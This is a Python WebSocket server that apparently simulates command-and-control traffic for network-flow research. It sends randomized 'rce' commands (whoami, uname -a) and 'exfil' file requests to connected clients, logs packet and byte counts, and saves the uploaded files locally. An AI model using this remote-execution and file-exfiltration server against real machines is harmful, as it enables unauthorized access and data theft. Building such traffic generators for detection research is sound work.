"""
see note 10.2.2025
- we follow for-loop approach where the connection lasts up to all action in the random generted config executed 
by the one by one. 
- once for loop has finished it send {"finish":"finish"} to client to break the whil-true loop
"""
import asyncio
import websockets
import json
import random, logging ,time
from ConfigGenerator import config_generator
from Sniff import Sniffer


class WebSocketServer:
    def __init__(self):
        self.clients = {}  # Stores client stats and assigned commands
        
        # start sniffer
        #self.sniffer = Sniffer(self)  # Attach the Sniffer class
        #self.sniffer.start()  # Start packet sniffing

        # Configure the logging settings
        # the following ensure the log by those library wont be added at info/debug level but warning 
        logging.getLogger('websockets').setLevel(logging.WARNING)  # Set to WARNING or higher
        logging.getLogger('asyncio').setLevel(logging.WARNING)  # Set to WARNING or higher
        
        logging.basicConfig(
            filename='websocket/output.log',          # Log to this file
            filemode='w',  # Set to 'a' to append to the log file
            level=logging.DEBUG,             # Set log level to DEBUG (you can adjust it)
            format='%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s',  # Log format with microseconds
             )
    def get_client_id(self, websocket):
        """Generate a unique client identifier using the client's real IP and source port."""
        peername = websocket.remote_address
        if peername:
            return f"{peername[0]}:{peername[1]}"  # Client IP:Port
        return "unknown_client"

    def assign_random_command(self):
        """Randomly select a command for a new client."""
        return random.choice(self.config["command_list"])

    def check_termination(self, client_id):
        """Check if all termination conditions for a client are met."""
        if client_id not in self.clients:
            return False
        
        conditions = self.config["termination_conditions"] # for now just also add it as action to the list, it shoudl be fix later not to be sent 
        return all(self.clients[client_id][condition] >= self.config[condition] for condition in conditions)

    async def exfil(self, websocket, client_id, key , value):
        await websocket.send(json.dumps({key:value}))
        self.clients[client_id]["dst2src_packets"] += 1
        self.clients[client_id]["dst2src_bytes"] += len({key:value})
        self.clients[client_id]["dst2src_max_ps"] = max(
            self.clients[client_id]["dst2src_max_ps"], len({key:value})  )
        logging.info(f"Sent Exfil action  {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
        store_exfiled_files = f"websocket/exfiled_data/{value}"
        with open(store_exfiled_files, "wb") as file:
            while True:
                data = await websocket.recv()
                self.clients[client_id]["src2dst_packets"] += 1
                self.clients[client_id]["src2dst_bytes"] += len(data)
                self.clients[client_id]["src2dst_max_ps"] = max(
                self.clients[client_id]["src2dst_max_ps"], len(data)
                                )
                if not data:
                    break
                if data == "exfil_done": # we send a signal to show that all chunks of the file has sent
                    break
                file.write(data)
            file.close()
            logging.info(f"✅ Exfil completed for file: {value} from the client: {client_id} underlying parmams: {self.clients[client_id]}")
            print('✅ Exfil completed')
    async def rce(self, websocket, client_id, key, value):
        # Send command to client
        await websocket.send(json.dumps({key:value}))
        self.clients[client_id]["dst2src_packets"] += 1
        self.clients[client_id]["dst2src_bytes"] += len({key:value})
        self.clients[client_id]["dst2src_max_ps"] = max(
            self.clients[client_id]["dst2src_max_ps"], len({key:value})
        )
        logging.info(f"Sent RCE action {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")

        # Receive execution result
        rce_output = await websocket.recv()
        self.clients[client_id]["src2dst_packets"] += 1
        self.clients[client_id]["src2dst_bytes"] += len(rce_output)
        self.clients[client_id]["src2dst_max_ps"] = max(
            self.clients[client_id]["src2dst_max_ps"], len(rce_output)
        )
        logging.info(f"💻 RCE output {key}: {value} to be  executed on client: {client_id} underlying parmams: {self.clients[client_id]}")
        print(f"💻 RCE output {rce_output}")

        
    async def handle_client(self, websocket, path):
        client_id = self.get_client_id(websocket)
        logging.info(f"client id:{client_id}")
        # if pertube requred 

        conf= config_generator("websocket/config.yaml", src2dst_packets=10, dst2src_packets=10,termination_conditions= ["src2dst_packets", "dst2src_packets"])
        self.config=conf.config_maker()
        logging.info(f"Generated config for client id:{client_id}: {self.config}")
        self.clients[client_id] = {
           # "command": assigned_command,
            "src2dst_packets": 0, "src2dst_bytes": 0, "src2dst_max_ps": 0,
            "dst2src_packets": 0, "dst2src_bytes": 0, "dst2src_max_ps": 0}
        try:
            for key,value in self.config.items():
                # if it is exfil 
                if "exfil" in key:
                    await self.exfil(websocket=websocket,client_id=client_id, key=key ,value=value)
                    #IAT between each command to be executed 
                    await asyncio.sleep(random.randint(3,6))
                # if rce
                elif "rce" in key:
                    await self.rce(websocket=websocket,client_id=client_id, key=key ,value=value)
                    #IAT between each command to be executed 
                    await asyncio.sleep(random.randint(3,6))
                # Check if termination conditions are met
                if self.check_termination(client_id):
                    print(f"⚠️ [{client_id}] Termination conditions met. Closing connection.")
                    logging.info(f"⚠️ [{client_id}] Termination conditions met. Closing connection==>underlying parmams: {self.clients[client_id]}")
                    await websocket.close()
                    del self.clients[client_id]  # Remove client from tracking

            await websocket.send(json.dumps({"finish":"finish"}))
        except websockets.exceptions.ConnectionClosed:
            print(f"🔌 Client disconnected: {client_id}")
            if client_id in self.clients:
                del self.clients[client_id]
        finally: # when client execute websocke.close()
            print(f"🔌 Connection has ended: {client_id}")
            logging.info(f"🔌 Connection has ended: {client_id}")
    async def start(self):
        async with websockets.serve(self.handle_client, "0.0.0.0", 5000):
            print("🚀 Server running on ws://0.0.0.0:5000")
            await asyncio.Future()  # Keep running

# Start the server
config = {
    "command_list": ["ls", "whoami", "pwd", "uname -a"],
    "src2dst_packets": 500,
    "src2dst_bytes": 1000,
    "src2dst_max_ps": 2048,
    "dst2src_packets": 500,
    "dst2src_bytes": 1000,
    "dst2src_max_ps": 2048,
    "termination_conditions": ["src2dst_packets"]
}




server = WebSocketServer()
asyncio.run(server.start())